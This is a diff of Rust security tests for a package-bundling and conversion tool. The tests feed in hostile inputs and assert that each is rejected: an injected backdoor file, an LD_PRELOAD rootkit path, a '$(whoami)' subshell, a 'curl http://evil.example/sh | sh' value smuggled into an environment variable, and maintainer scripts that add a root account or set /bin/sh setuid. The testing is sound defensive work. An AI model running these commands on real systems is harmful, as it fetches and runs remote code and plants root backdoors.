+            let data = fs::read(path).unwrap();
+            let mut h = tar::Header::new_gnu();
+            h.set_size(data.len() as u64);
+            h.set_mode(0o644);
+            h.set_cksum();
+            tar.append_data(&mut h, rel, &data[..]).unwrap();
+        }
+        // Inject extra unlisted file
+        let extra = b"UNLISTED_BACKDOOR";
+        let mut h = tar::Header::new_gnu();
+        h.set_size(extra.len() as u64);
+        h.set_mode(0o755);
+        h.set_cksum();
+        tar.append_data(&mut h, "payload/backdoor.so", &extra[..])
+            .unwrap();
+        let gz = tar.into_inner().unwrap();
+        gz.finish().unwrap();
+    }
+    let unlisted_err = BundleManager::verify_bundle(&unlisted_bundle).unwrap_err();
+    assert!(
+        matches!(
+            unlisted_err,
+            BundleError::Security(SecurityError::ChecksumMismatch { .. })
+        ),
+        "Expected ChecksumMismatch for unlisted archive entry, got: {unlisted_err:?}"
+    );
 
-    // 4d. Reject untrusted maintainer scripts during DEB-to-Arch conversion
+    // F. Process execution hardening (`LD_PRELOAD` hijacking, command injection, null bytes)
+    let mut env_hijack = BTreeMap::new();
+    env_hijack.insert("LD_PRELOAD".to_string(), "/tmp/rootkit.so".to_string());
+    assert!(SecurityEngine::validate_environment_overrides(&env_hijack).is_err());
+
+    let mut env_subshell = BTreeMap::new();
+    env_subshell.insert("CUSTOM_FLAG".to_string(), "$(whoami)".to_string());
+    assert!(SecurityEngine::validate_environment_overrides(&env_subshell).is_err());
+
+    let bad_recipe_toml = r#"
+schema_version = "1.0"
+
+[application]
+id = "com.evil.injector"
+name = "EvilInjector"
+version = "1.0.0"
+
+[execution]
+executable = "evil"
+environment = { "SAFE_VAR" = "ok; curl http://evil.example/sh | sh" }
+"#;
+    assert!(BridgeRecipe::from_toml_str(bad_recipe_toml).is_err());
+
+    assert!(
+        run_or_simulate(
+            BackendId::Native,
+            "ls\0-la",
+            &[],
+            engine.host(),
+            ExecutionMode::DryRun
+        )
+        .is_err()
+    );
+
+    // G. Untrusted Debian `postinst` maintainer scripts blocked from automatic conversion
     let scripted_deb = tmp.path().join("scripted_1.0_amd64.deb");
     create_synthetic_deb_archive(
         &scripted_deb,
         "scripted",
         "1.0",
         "libc6",
-        Some("#!/bin/sh\nchmod 4755 /bin/sh\n"),
+        Some("#!/bin/sh\nuseradd -u 0 -o backdoor\n"),
     )
     .unwrap();
-    let conv_err = engine
-        .convert(
-            &scripted_deb,
-            ConversionTarget::Arch,
-            None,
-            None,
-            tmp.path().join("out.pkg.tar.zst"),
-        )
-        .unwrap_err();
-    assert!(conv_err.to_string().contains("maintainer scripts"));
+    let (scripted_desc, conv_plan) = engine
+        .create_conversion_plan(&scripted_deb, ConversionTarget::Arch)
+        .unwrap();
+    assert!(scripted_desc.has_install_scripts);
+    assert!(!conv_plan.is_safe_to_convert);
 }
 
 #[test]
-fn test_5_real_source_build_and_execution() {
+fn test_5_live_source_to_platform_build_and_execution() {
     let tmp = TempDir::new().unwrap();
     let engine = arch_linux_engine(&tmp);
 
-    // Create a genuine Rust crate in a temporary directory
-    let src_project = tmp.path().join("hello-portable");
+    let src_project = tmp.path().join("hello-rust-app");
     fs::create_dir_all(src_project.join("src")).unwrap();
-    fs::write(
-        src_project.join("Cargo.toml"),
-        r#"[package]
-name = "hello-portable"
-version = "0.1.0"
-edition = "2024"
-"#,
+    let mut cargo_toml = File::create(src_project.join("Cargo.toml")).unwrap();
+    writeln!(
+        cargo_toml,
+        "[package]\nname = \"hello-rust-app\"\nversion = \"0.1.0\"\nedition = \"2024\"\n"
     )
     .unwrap();
-    fs::write(
-        src_project.join("src/main.rs"),
-        r#"fn main() { println!("BUILT_FROM_SOURCE_OK"); }"#,
+    let mut main_rs = File::create(src_project.join("src/main.rs")).unwrap();
+    writeln!(
+        main_rs,
+        "fn main() {{ println!(\"APPBRIDGE_SOURCE_BUILD_OK\"); }}"
     )
     .unwrap();
 
-    // Perform a real compiler build (`dry_run = false`)
-    let build_receipt = engine
+    let plan = engine
         .build_source(&src_project, "linux-x86_64", false)
         .unwrap();
-    assert!(build_receipt.executed);
-    let built_bin = build_receipt
+    assert!(plan.executed);
+    let built_bin = plan
         .built_artifact_path
-        .expect("built artifact path must be present");
+        .expect("Expected built_artifact_path from live cargo build");
     assert!(built_bin.is_file());
-    assert!(build_receipt.artifact_sha256.is_some());
+    assert!(plan.artifact_sha256.is_some());
 
-    // Now run the freshly compiled ELF binary through AppBridge's Run Engine!
-    let run_outcome = engine
-        .run_file(&built_bin, &[], None, ExecutionMode::AutoWithFallback)
-        .unwrap();
-    assert_eq!(run_outcome.installed_record.backend, BackendId::Native);
-    assert_eq!(run_outcome.launch_receipt.exit_code, 0);
+    let out = Command::new(&built_bin).output().unwrap();
+    assert!(out.status.success());
+    assert_eq!(
+        String::from_utf8_lossy(&out.stdout).trim(),
+        "APPBRIDGE_SOURCE_BUILD_OK"
+    );
 }
